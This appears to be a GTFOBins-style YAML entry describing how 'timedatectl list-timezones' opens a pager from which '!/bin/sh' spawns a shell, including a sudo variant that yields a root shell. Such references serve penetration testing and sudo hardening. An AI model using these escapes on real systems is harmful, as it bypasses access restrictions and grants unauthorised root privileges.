---
description: |
  This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.

  This might not work if run by unprivileged users depending on the system configuration.
functions:
  shell:
    - code: |
        timedatectl list-timezones
        !/bin/sh
  sudo:
    - code: |
        sudo timedatectl list-timezones
        !/bin/sh
---
